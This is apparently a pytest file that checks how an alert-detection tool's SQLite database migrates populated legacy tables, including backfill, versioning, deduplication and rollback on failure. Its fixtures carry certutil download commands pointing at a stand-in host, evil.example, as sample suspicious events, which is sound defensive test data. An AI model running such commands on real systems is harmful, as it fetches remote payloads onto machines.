"""
Migration tests: populated legacy databases must reach the current schema.

Finding E2: the legacy migration used ALTER TABLE ADD COLUMN with a
non-constant default (CURRENT_TIMESTAMP) on updated_at. SQLite rejects
that on a populated table, the old code logged a warning and continued,
and every later deduplicated write failed because updated_at was missing.
These tests pin the fixed behavior: atomic, versioned, fail-loud
migration that works on populated legacy databases.
"""
import sqlite3
from datetime import datetime

import pytest

from collectors.base import Event
from core.database import (
    SCHEMA_MIGRATIONS,
    AlertDatabase,
    MigrationError,
)
from core.engine import Alert


# The pre-migration (legacy v0) alerts table exactly as old releases
# created it, before host/fingerprint/state/updated_at columns existed.
LEGACY_ALERTS_TABLE = """
    CREATE TABLE alerts (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        rule_id TEXT NOT NULL,
        rule_name TEXT NOT NULL,
        severity TEXT NOT NULL,
        score INTEGER NOT NULL,
        platform TEXT NOT NULL,
        process_name TEXT NOT NULL,
        command_line TEXT NOT NULL,
        user TEXT NOT NULL,
        parent_process_name TEXT,
        timestamp DATETIME NOT NULL,
        mitre_attack TEXT,
        description TEXT,
        response TEXT,
        event_data TEXT,
        created_at DATETIME DEFAULT CURRENT_TIMESTAMP
    )
"""


def _create_legacy_db(path: str, rows: int = 3) -> None:
    conn = sqlite3.connect(path)
    conn.execute(LEGACY_ALERTS_TABLE)
    for i in range(rows):
        conn.execute(
            """
            INSERT INTO alerts (
                rule_id, rule_name, severity, score, platform,
                process_name, command_line, user, timestamp
            ) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)
            """,
            (
                "WIN-001",
                "Legacy Rule",
                "high",
                95 - i,
                "windows",
                "certutil.exe",
                f"certutil.exe -urlcache -f http://evil.example/{i}",
                "legacyuser",
                f"2026-01-0{i + 1} 10:00:00",
            ),
        )
    conn.commit()
    conn.close()


@pytest.fixture
def legacy_db(tmp_path):
    """A populated database in the legacy schema."""
    path = tmp_path / "legacy.db"
    _create_legacy_db(str(path), rows=3)
    return str(path)


def _make_alert() -> Alert:
    event = Event(
        timestamp=datetime(2026, 2, 1, 12, 0, 0),
        platform="windows",
        process_name="certutil.exe",
        command_line="certutil.exe -urlcache -split -f http://evil.example/x",
        user="baduser",
        process_id=1234,
        parent_process_name="cmd.exe",
    )
    return Alert(
        rule_id="WIN-001",
        rule_name="Certutil Download",
        severity="high",
        event=event,
        timestamp=event.timestamp,
        mitre_attack=["T1105"],
        description="Suspicious certutil download",
        response=["Investigate"],
        score=130,
    )


def _table_columns(path: str) -> set:
    conn = sqlite3.connect(path)
    columns = {row[1] for row in conn.execute("PRAGMA table_info(alerts)")}
    conn.close()
    return columns


def test_populated_legacy_database_migrates(legacy_db):
    """A populated legacy database reaches the current schema."""
    db = AlertDatabase(legacy_db)
    try:
        columns = _table_columns(legacy_db)
        assert {"updated_at", "host", "fingerprint", "state"} <= columns
    finally:
        db.close()


def test_legacy_rows_get_updated_at_backfilled(legacy_db):
    """Pre-existing rows receive a real updated_at value, not NULL."""
    db = AlertDatabase(legacy_db)
    try:
        values = [
            row[0]
            for row in db.connection.execute("SELECT updated_at FROM alerts")
        ]
        assert len(values) == 3
        assert all(value is not None for value in values)
    finally:
        db.close()


def test_migration_records_schema_version(legacy_db):
    """After migration the database reports the current schema version."""
    db = AlertDatabase(legacy_db)
    try:
        version = db.connection.execute("PRAGMA user_version").fetchone()[0]
        assert version == max(v for v, _ in SCHEMA_MIGRATIONS)
    finally:
        db.close()


def test_fresh_database_reports_current_schema_version(tmp_path):
    """A brand new database also reports the current schema version."""
    db = AlertDatabase(str(tmp_path / "fresh.db"))
    try:
        version = db.connection.execute("PRAGMA user_version").fetchone()[0]
        assert version == max(v for v, _ in SCHEMA_MIGRATIONS)
    finally:
        db.close()


def test_migration_is_idempotent_on_reopen(legacy_db):
    """Opening an already migrated database again is a no-op."""
    db = AlertDatabase(legacy_db)
    db.close()

    db = AlertDatabase(legacy_db)
    try:
        alert_id = db.save_alert(_make_alert())
        assert alert_id is not None
    finally:
        db.close()


def test_deduplicated_insert_works_after_legacy_migration(legacy_db):
    """The dedup path (the downstream break) works after migration."""
    db = AlertDatabase(legacy_db)
    try:
        first = db.save_alert_dedup(_make_alert())
        assert first["alert_id"] is not None
        assert first["is_duplicate"] is False

        second = db.save_alert_dedup(_make_alert())
        assert second["is_duplicate"] is True
        assert second["alert_id"] == first["alert_id"]
    finally:
        db.close()


def test_failed_migration_aborts_and_rolls_back(legacy_db, monkeypatch):
    """A failing migration raises MigrationError and leaves no partial schema."""
    import core.database as database_module

    def broken_migration(cursor):
        cursor.execute("ALTER TABLE alerts ADD COLUMN scratch_col TEXT")
        raise RuntimeError("simulated migration failure")

    target = max(v for v, _ in SCHEMA_MIGRATIONS) + 1
    monkeypatch.setattr(
        database_module,
        "SCHEMA_MIGRATIONS",
        list(SCHEMA_MIGRATIONS) + [(target, broken_migration)],
    )

    with pytest.raises(MigrationError):
        AlertDatabase(legacy_db)

    conn = sqlite3.connect(legacy_db)
    columns = {row[1] for row in conn.execute("PRAGMA table_info(alerts)")}
    version = conn.execute("PRAGMA user_version").fetchone()[0]
    conn.close()

    assert "scratch_col" not in columns
    # The whole migration ran in one transaction, so nothing else stuck.
    assert "updated_at" not in columns
    assert version == 0
